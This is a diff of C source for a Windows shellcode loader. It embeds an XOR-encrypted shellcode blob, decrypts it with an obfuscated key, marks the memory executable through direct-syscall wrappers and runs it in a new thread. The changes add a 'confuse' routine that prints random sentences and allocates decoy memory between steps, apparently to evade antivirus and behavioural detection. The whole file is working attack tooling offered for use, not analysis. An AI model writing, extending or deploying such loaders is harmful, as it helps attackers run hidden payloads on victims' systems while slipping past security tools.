@@ -1,17 +1,38 @@
 ﻿#include <windows.h>
 #include <winternl.h>
 #include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
 #include "crypto.h"
 #include "evasion.h"
 #include "syscalls.h"
 #include "ntwrappers.h"
+#include "lostwritings.h"
 
 
 static unsigned char sc[] = "\x94\x27\xed\x81\x83\x9c\xa8\x6f\x6e\x65\x32\x25\x29\x3f\x3c\x34\x25\x3c\x59\xbd\x0b\x2d\xf8\x26\x08\x27\xe5\x37\x6b\x3c\xe3\x3d\x4e\x2d\xf8\x06\x38\x27\x61\xd2\x39\x3e\x25\x5e\xa7\x2d\x42\xb4\xc4\x53\x0f\x19\x71\x58\x48\x2e\xaf\xac\x7e\x35\x69\xae\x8c\x88\x21\x35\x39\x27\xe5\x37\x53\xff\x2a\x53\x26\x64\xa3\xff\xe8\xe7\x6e\x65\x73\x3c\xed\xaf\x1a\x02\x3b\x75\xb8\x3f\xe5\x2d\x6b\x30\xe3\x2f\x4e\x2c\x72\xa4\x8b\x39\x26\x9a\xba\x35\xe3\x5b\xe6\x2d\x72\xa2\x25\x5e\xa7\x2d\x42\xb4\xc4\x2e\xaf\xac\x7e\x35\x69\xae\x56\x85\x06\x85\x24\x6c\x22\x41\x7b\x31\x51\xbe\x1b\xbd\x2b\x30\xe3\x2f\x4a\x2c\x72\xa4\x0e\x2e\xe5\x69\x3b\x30\xe3\x2f\x72\x2c\x72\xa4\x29\xe4\x6a\xed\x3b\x75\xb8\x2e\x36\x24\x2b\x2a\x31\x35\x2f\x3d\x32\x2d\x29\x35\x26\xe6\x9f\x54\x29\x3d\x91\x85\x2b\x35\x31\x35\x26\xee\x61\x9d\x3f\x90\x91\x9a\x2e\x3c\xd2\x6e\x6e\x65\x73\x74\x68\x6f\x6e\x2d\xfe\xf9\x69\x6e\x6e\x65\x32\xce\x59\xe4\x01\xe2\x8c\xa1\xd3\x9f\xdb\xc7\x25\x35\xd2\xc9\xfb\xd8\xee\x8b\xbd\x27\xed\xa1\x5b\x48\x6e\x13\x64\xe5\x88\x94\x1d\x6a\xd5\x22\x60\x06\x07\x05\x6e\x3c\x32\xfd\xb2\x90\xbb\x06\x12\x18\x0b\x41\x0b\x1d\x16\x74";
 
-int main(void){
-    dircheck("build");
-    Sleep(8000);
+void confuse() {
+    for (int i = 0; i < 5; i++) {
+        PLARGE_INTEGER random_num = 2000 + rand() % (10000 - 2000 + 1);
+        char* s = randomsentence();
+        size_t ssize = strlen(s) + 1;
+        char* tempbuf = (char*)h_ntallocatevirtualmemory(ssize, PAGE_READWRITE);
+        strcpy_s(tempbuf, ssize, s);
+        puts(tempbuf);
+        fflush(stdout);
+        ULONG op;
+        h_ntprotectvirtualmemory(tempbuf, sizeof(tempbuf), PAGE_READONLY, &op);
+        //secure_zero(tempbuf, sizeof(tempbuf));
+        //h_ntdelayexecution(FALSE, random_num);
+    }
+}
+
+int main(void) {
+    srand(time(NULL));
+
+    //dircheck("build");
+    //h_ntdelayexecution(FALSE, random_num);
     InitSyscalls();
     SIZE_T sc_size = sizeof(sc) - 1;
     char* buf = (char*)h_ntallocatevirtualmemory(sc_size, PAGE_READWRITE);
@@ -20,18 +41,31 @@ int main(void){
         return -1;
     }
 
+    confuse();
+
     memcpy(buf, sc, sc_size);
+
+    confuse();
+
     //decrypt shellcode
-    static unsigned char key[] = "honest";
-    SIZE_T key_len = sizeof(key) - 1;  // drop '\0'
+    SIZE_T key_len = sizeof(s_key) - 1;  // drop '\0'
+    unsigned char key[32];
+    obf_decode(key, s_key, sizeof(s_key));
     xor_decrypt((unsigned char*)buf, sc_size, key, key_len);
+    secure_zero(key, sizeof(key));
+
+    confuse();
    
     ULONG oldprotect;
     h_ntprotectvirtualmemory(buf, sc_size, PAGE_EXECUTE_READ, &oldprotect); 
 
+    confuse();
+
     HANDLE hThread = NULL;
 	h_ntcreatethreadex(&hThread, buf, NULL);
     WaitForSingleObject(hThread, INFINITE);
+
+    h_ntprotectvirtualmemory(buf, sc_size, PAGE_READONLY, &oldprotect);
 
     return 0;
 }
